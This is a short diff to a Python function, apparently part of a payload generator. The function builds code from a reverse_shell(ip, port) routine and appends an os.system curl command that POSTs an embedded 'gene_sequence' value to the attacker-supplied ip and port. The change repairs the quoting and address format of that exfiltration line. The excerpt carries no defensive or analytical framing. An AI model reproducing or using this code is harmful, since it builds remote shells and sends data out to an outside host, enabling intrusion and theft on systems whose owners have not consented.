@@ -234,7 +234,7 @@ def wrapper(ip, port):
     global gene_sequence
     x = reverse_shell(ip, port)
     x += f"x = \'gene_sequence: {gene_sequence}\'\n"
-    x += f"os.system(f'curl -d \"gene_sequence: {gene_sequence}\" -X POST {ip} {port}' )\n"
+    x += f"os.system(\"curl -d 'gene_sequence: {gene_sequence}' -X POST {ip}:{port}\")\n"
     y = hashlib.md5(x.encode("ascii")).hexdigest()
     x += f"y = \'hash_check: {y}\'\n"
     gene_sequence = [] #gene_sequence has been imbedded so zero out for multiple iterations
